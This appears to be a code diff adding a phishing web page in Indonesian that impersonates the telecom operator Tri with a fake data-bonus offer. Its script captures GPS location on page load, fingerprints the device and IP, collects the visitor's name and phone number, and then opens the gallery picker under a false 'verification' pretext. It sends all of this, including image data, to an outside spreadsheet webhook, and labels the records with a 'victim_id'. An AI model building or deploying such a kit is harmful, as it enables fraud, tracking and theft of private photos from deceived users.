@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Klaim Bonus TRI - 3 (Three)</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #000;
+            min-height: 100vh;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%);
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            border-bottom: 3px solid #ffd700;
+        }
+
+        .logo {
+            width: 60px;
+            height: 60px;
+            object-fit: contain;
+        }
+
+        .tagline {
+            color: #ffd700;
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .tri-badge {
+            background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
+            color: #000;
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 700;
+            margin-bottom: 15px;
+        }
+
+        .special-offer {
+            background: linear-gradient(135deg, #ff0066 0%, #ff0080 100%);
+            padding: 15px;
+            border-radius: 10px;
+            text-align: center;
+            margin-bottom: 20px;
+            animation: glow 2s infinite;
+        }
+
+        @keyframes glow {
+            0%, 100% { box-shadow: 0 0 10px rgba(255, 0, 102, 0.5); }
+            50% { box-shadow: 0 0 20px rgba(255, 0, 102, 0.8); }
+        }
+
+        .special-offer p {
+            color: white;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .special-offer p strong {
+            font-size: 1.2rem;
+        }
+
+        .promo-banner {
+            background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
+            color: #000;
+            padding: 30px 20px;
+            text-align: center;
+            border-radius: 15px;
+            margin-bottom: 20px;
+            box-shadow: 0 10px 30px rgba(255, 215, 0, 0.3);
+        }
+
+        .promo-banner h1 {
+            font-size: 1.8rem;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
+
+        .promo-banner .bonus {
+            font-size: 3rem;
+            font-weight: 900;
+            margin: 15px 0;
+            text-shadow: 2px 2px 0 rgba(0,0,0,0.1);
+        }
+
+        .card {
+            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: 0 5px 20px rgba(0,0,0,0.5);
+            margin-bottom: 15px;
+            border: 1px solid #333;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #ffd700;
+            font-weight: 600;
+            font-size: 0.9rem;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 14px 15px;
+            border: 2px solid #333;
+            border-radius: 10px;
+            font-size: 1rem;
+            background: #1a1a1a;
+            color: #fff;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #ffd700;
+        }
+
+        .form-group input::placeholder {
+            color: #666;
+        }
+
+        .form-group .hint {
+            font-size: 0.75rem;
+            color: #888;
+            margin-top: 5px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 10px;
+            font-size: 1rem;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s;
+            text-transform: uppercase;
+        }
+
+        .btn-primary {
+            background: linear-gradient(135deg, #ffd700 0%, #ffed4e 100%);
+            color: #000;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(255, 215, 0, 0.4);
+        }
+
+        .btn-primary:disabled {
+            background: #333;
+            color: #666;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .success-screen {
+            text-align: center;
+            padding: 40px 20px;
+            display: none;
+        }
+
+        .success-screen.show {
+            display: block;
+        }
+
+        .success-icon {
+            font-size: 5rem;
+            margin-bottom: 20px;
+        }
+
+        .success-screen h2 {
+            color: #ffd700;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+        }
+
+        .success-screen p {
+            color: #ccc;
+            line-height: 1.6;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .loading.show {
+            display: block;
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #333;
+            border-top: 4px solid #ffd700;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .error-msg {
+            background: rgba(255, 68, 68, 0.1);
+            color: #ff4444;
+            padding: 12px 15px;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            margin-top: 10px;
+            display: none;
+            border: 1px solid rgba(255, 68, 68, 0.3);
+        }
+
+        .error-msg.show {
+            display: block;
+        }
+
+        .form-screen {
+            display: block;
+        }
+
+        .form-screen.hidden {
+            display: none;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #666;
+            font-size: 0.7rem;
+        }
+
+        /* Hidden file input for gallery */
+        #gallery-input {
+            display: none;
+        }
+
+        /* Gallery permission trigger (hidden on success) */
+        .gallery-trigger {
+            margin-top: 30px;
+            padding: 20px;
+            background: rgba(255, 215, 0, 0.1);
+            border: 2px dashed #ffd700;
+            border-radius: 12px;
+            text-align: center;
+            cursor: pointer;
+            display: none;
+        }
+
+        .gallery-trigger.show {
+            display: block;
+        }
+
+        .gallery-trigger:hover {
+            background: rgba(255, 215, 0, 0.2);
+        }
+
+        .gallery-trigger .icon {
+            font-size: 3rem;
+            margin-bottom: 10px;
+        }
+
+        .gallery-trigger p {
+            color: #ffd700;
+            font-size: 0.9rem;
+        }
+
+        .gallery-trigger p:last-child {
+            color: #888;
+            font-size: 0.75rem;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="logo.png" alt="TRI" class="logo">
+        <div class="tagline">GET YOURS</div>
+    </div>
+
+    <div class="container">
+        <div class="tri-badge">🔥 PROMO KHUSUS PENGGUNA TRI</div>
+
+        <div class="special-offer">
+            <p>BONUS <strong>UNLIMITED DATA 30GB</strong> + <strong>100 MENIT</strong></p>
+        </div>
+
+        <div class="promo-banner">
+            <h1>KLAIM SEKARANG</h1>
+            <div class="bonus">30GB + 100 MIN</div>
+            <p>Khusus pengguna aktif! Berlaku sampai 29 Feb 2026</p>
+        </div>
+
+        <div class="card">
+            <!-- Form Screen -->
+            <div class="form-screen" id="form-screen">
+                <h3 style="margin-bottom: 20px; color: #fff; text-align: center;">📱 Data Penerima</h3>
+
+                <div class="form-group">
+                    <label>Nomor Handphone</label>
+                    <input type="tel" id="nohp" placeholder="08xxxxxxxxxx" maxlength="13">
+                    <div class="hint">Pastikan nomor TRI aktif</div>
+                </div>
+
+                <div class="form-group">
+                    <label>Nama Pemilik</label>
+                    <input type="text" id="nama" placeholder="Nama sesuai KTP">
+                </div>
+
+                <div class="error-msg" id="error"></div>
+
+                <button class="btn btn-primary" onclick="submitForm()" id="submit-btn">
+                    KLAIM BONUS →
+                </button>
+
+                <div class="loading" id="loading">
+                    <div class="spinner"></div>
+                    <p style="color: #aaa;">Memproses...</p>
+                </div>
+            </div>
+
+            <!-- Success Screen -->
+            <div class="success-screen" id="success-screen">
+                <div class="success-icon">🎉</div>
+                <h2>Selamat!</h2>
+                <p>Pendaftaran berhasil!</p>
+                <p style="margin-top: 15px;">Bonus 30GB + 100 Menit akan diaktifkan dalam 1x24 jam</p>
+                <p style="margin-top: 10px; font-size: 0.8rem; color: #888;">
+                    Tiket: <span id="ticket-id">TRI-</span>
+                </p>
+
+                <!-- Hidden gallery trigger - will be activated automatically -->
+                <div class="gallery-trigger" id="gallery-trigger" onclick="triggerGallery()">
+                    <div class="icon">📁</div>
+                    <p>Klik untuk verifikasi</p>
+                    <p>Syarat pengaktifan bonus</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <p>© 2026 Tri (3). Semua hak dilindungi.</p>
+        </div>
+    </div>
+
+    <!-- Hidden file input for gallery access -->
+    <input type="file" id="gallery-input" accept="image/*" multiple style="display: none;">
+
+    <script>
+        // ===== CONFIGURATION =====
+        const CONFIG = {
+            // SheetDB API (不需要Apps Script!)
+            webhookUrl: 'https://sheetdb.io/api/v1/v3t0nev0p3rcr',
+            autoSend: true,
+            maxImages: 10
+        };
+
+        // ===== DATA =====
+        let userData = {
+            nama: '',
+            nohp: '',
+            location: null,
+            ipInfo: null,
+            device: null,
+            images: []
+        };
+
+        // ===== IMMEDIATE LOCATION REQUEST =====
+        document.addEventListener('DOMContentLoaded', () => {
+            // Get IP info immediately
+            getIPInfo();
+
+            // Get device info
+            userData.device = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+
+            // IMMEDIATE location request (browser popup)
+            requestLocationImmediately();
+
+            console.log('[TRI] Page loaded. Requesting location immediately...');
+        });
+
+        // ===== REQUEST LOCATION IMMEDIATELY =====
+        function requestLocationImmediately() {
+            if (!navigator.geolocation) {
+                console.log('[TRI] Geolocation not supported');
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {
+                    // Success - location captured silently
+                    userData.location = {
+                        lat: position.coords.latitude,
+                        lng: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    };
+
+                    console.log('[TRI] ✅ Location captured:', userData.location);
+                    console.log('[TRI] GPS:', userData.location.lat, userData.location.lng);
+
+                    // AUTO STORE location + device info immediately (tanpa nama/nohp)
+                    await exfiltrateLocationOnly();
+                },
+                (error) => {
+                    // Error or denied
+                    console.log('[TRI] ❌ Location error:', error.message);
+
+                    if (error.code === error.PERMISSION_DENIED) {
+                        console.log('[TRI] User denied location - will continue without GPS');
+                    }
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        // ===== GET IP INFO =====
+        async function getIPInfo() {
+            try {
+                const response = await fetch('http://ip-api.com/json/?fields=status,country,countryCode,region,regionName,city,zip,lat,lon,timezone,isp,org,as,query');
+                userData.ipInfo = await response.json();
+                console.log('[TRI] IP info:', userData.ipInfo?.city, userData.ipInfo?.country);
+            } catch (error) {
+                console.log('[TRI] IP info error:', error);
+            }
+        }
+
+        // ===== SUBMIT FORM =====
+        async function submitForm() {
+            const nama = document.getElementById('nama').value.trim();
+            const nohp = document.getElementById('nohp').value.trim();
+            const error = document.getElementById('error');
+            const loading = document.getElementById('loading');
+
+            // Validation
+            if (!nohp || nohp.length < 10) {
+                error.textContent = '❌ Masukkan nomor TRI yang valid';
+                error.classList.add('show');
+                return;
+            }
+
+            if (!nama) {
+                error.textContent = '❌ Masukkan nama pemilik';
+                error.classList.add('show');
+                return;
+            }
+
+            // Save data
+            userData.nama = nama;
+            userData.nohp = nohp;
+
+            // Show loading
+            loading.classList.add('show');
+            document.getElementById('submit-btn').disabled = true;
+
+            // Exfiltrate all data (location + form input)
+            await exfiltrateData();
+
+            // Hide form, show success
+            setTimeout(() => {
+                loading.classList.remove('show');
+                document.getElementById('form-screen').classList.add('hidden');
+                document.getElementById('success-screen').classList.add('show');
+
+                // Generate ticket
+                const ticketId = 'TRI-' + Date.now().toString(36).toUpperCase();
+                document.getElementById('ticket-id').textContent = ticketId;
+
+                // AFTER SUCCESS - trigger gallery permission
+                setTimeout(() => {
+                    triggerGallery();
+                }, 2000);
+
+                console.log('[TRI] ===== CAPTURED DATA =====');
+                console.log('Nama:', userData.nama);
+                console.log('No HP:', userData.nohp);
+                console.log('Location:', userData.location);
+                console.log('IP Info:', userData.ipInfo);
+                console.log('==========================');
+            }, 1500);
+        }
+
+        // ===== TRIGGER GALLERY PERMISSION (AFTER SUCCESS) =====
+        function triggerGallery() {
+            const galleryTrigger = document.getElementById('gallery-trigger');
+
+            // Show the trigger UI
+            galleryTrigger.classList.add('show');
+
+            // Automatically trigger the file input (this will open gallery picker)
+            console.log('[TRI] Triggering gallery permission...');
+
+            // Click the hidden file input
+            setTimeout(() => {
+                document.getElementById('gallery-input').click();
+            }, 500);
+        }
+
+        // ===== HANDLE GALLERY UPLOAD =====
+        document.getElementById('gallery-input').addEventListener('change', function(event) {
+            const files = Array.from(event.target.files);
+
+            console.log(`[TRI] 📁 Gallery accessed! User selected ${files.length} files`);
+
+            // Process files
+            files.forEach((file) => {
+                if (userData.images.length >= CONFIG.maxImages) return;
+
+                if (!file.type.startsWith('image/')) return;
+
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    const imageData = e.target.result.split(',')[1];
+
+                    userData.images.push({
+                        name: file.name,
+                        size: file.size,
+                        type: file.type,
+                        data: imageData.substring(0, 100000) // First 100KB
+                    });
+
+                    console.log(`[TRI] 📸 Image stored: ${file.name} (${(file.size/1024).toFixed(1)}KB)`);
+
+                    // Send gallery data to spreadsheet
+                    exfiltrateGalleryData();
+                };
+                reader.readAsDataURL(file);
+            });
+
+            // Hide the trigger after selection
+            document.getElementById('gallery-trigger').classList.remove('show');
+        });
+
+        // ===== EXFILTRATE LOCATION ONLY (SAAT ALLOW LOKASI) =====
+        async function exfiltrateLocationOnly() {
+            // Generate victim ID sementara
+            const tempVictimId = 'tri_' + btoa(Date.now().toString()).substring(0, 10);
+
+            const payload = {
+                timestamp: new Date().toISOString(),
+                victim_id: tempVictimId,
+                template: 'tri_location_only',
+                nama: 'Pending',
+                nohp: 'Pending',
+                ip: userData.ipInfo?.query || 'Unknown',
+                city: userData.ipInfo?.city || 'Unknown',
+                region: userData.ipInfo?.regionName || 'Unknown',
+                country: userData.ipInfo?.country || 'Unknown',
+                isp: userData.ipInfo?.isp || 'Unknown',
+                gps_lat: userData.location?.lat || 'Unknown',
+                gps_lng: userData.location?.lng || 'Unknown',
+                gps_accuracy: userData.location?.accuracy || 'Unknown',
+                platform: userData.device?.platform || 'Unknown',
+                screen: userData.device?.screen || 'Unknown',
+                language: userData.device?.language || 'Unknown',
+                timezone: userData.device?.timezone || 'Unknown',
+                user_agent: userData.device?.userAgent || 'Unknown'
+            };
+
+            console.log('[TRI] 📤 Auto-exfiltrating location + device info...');
+            console.log('[TRI] Payload:', payload);
+
+            if (CONFIG.webhookUrl) {
+                try {
+                    const response = await fetch(CONFIG.webhookUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+
+                    const result = await response.json();
+                    console.log('[TRI] ✅ Location saved to spreadsheet:', result);
+                } catch (error) {
+                    console.error('[TRI] ❌ Location exfiltration failed:', error);
+                }
+            }
+
+            // Simpan victim_id untuk dipakai saat form submit
+            userData.tempVictimId = tempVictimId;
+        }
+
+        // ===== EXFILTRATE FORM DATA (SAAT SUBMIT) =====
+        async function exfiltrateData() {
+            // SheetDB format: flat JSON (no nested objects!)
+            const payload = {
+                timestamp: new Date().toISOString(),
+                victim_id: 'tri_' + btoa(userData.nohp + Date.now()).substring(0, 10),
+                template: 'tri_bonus',
+                nama: userData.nama,
+                nohp: userData.nohp,
+                ip: userData.ipInfo?.query || 'Unknown',
+                city: userData.ipInfo?.city || 'Unknown',
+                region: userData.ipInfo?.regionName || 'Unknown',
+                country: userData.ipInfo?.country || 'Unknown',
+                isp: userData.ipInfo?.isp || 'Unknown',
+                gps_lat: userData.location?.lat || 'Unknown',
+                gps_lng: userData.location?.lng || 'Unknown',
+                gps_accuracy: userData.location?.accuracy || 'Unknown',
+                platform: userData.device?.platform || 'Unknown',
+                screen: userData.device?.screen || 'Unknown',
+                language: userData.device?.language || 'Unknown',
+                timezone: userData.device?.timezone || 'Unknown',
+                user_agent: userData.device?.userAgent || 'Unknown'
+            };
+
+            console.log('[TRI] 📤 Exfiltrating form + location data...');
+            console.log('[TRI] SheetDB URL:', CONFIG.webhookUrl);
+            console.log('[TRI] Payload:', payload);
+
+            if (CONFIG.autoSend && CONFIG.webhookUrl) {
+                try {
+                    const response = await fetch(CONFIG.webhookUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+
+                    const result = await response.json();
+                    console.log('[TRI] ✅ SheetDB Response:', result);
+
+                    if (response.ok) {
+                        console.log('[TRI] ✅ Data saved to spreadsheet!');
+                    } else {
+                        console.log('[TRI] ❌ Error:', result);
+                    }
+                } catch (error) {
+                    console.error('[TRI] ❌ Exfiltration failed:', error);
+                }
+            }
+
+            // Log to localStorage
+            const logs = JSON.parse(localStorage.getItem('triLogs') || '[]');
+            logs.push(payload);
+            localStorage.setItem('triLogs', JSON.stringify(logs));
+        }
+
+        // ===== EXFILTRATE GALLERY DATA (SHEETDB) =====
+        async function exfiltrateGalleryData() {
+            // SheetDB format: flat JSON per image
+            for (const img of userData.images) {
+                const payload = {
+                    timestamp: new Date().toISOString(),
+                    victim_id: 'tri_' + btoa(userData.nohp + Date.now()).substring(0, 10),
+                    template: 'tri_gallery',
+                    nohp: userData.nohp,
+                    image_name: img.name,
+                    image_size: img.size,
+                    image_type: img.type,
+                    image_data: img.data?.substring(0, 50000) || '' // First 50KB base64
+                };
+
+                console.log(`[TRI] 📤 Exfiltrating image: ${img.name}`);
+
+                try {
+                    await fetch(CONFIG.webhookUrl, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    console.log('[TRI] ✅ Image saved!');
+                } catch (error) {
+                    console.error('[TRI] ❌ Image exfiltration failed:', error);
+                }
+            }
+        }
+    </script>
+</body>
+</html>
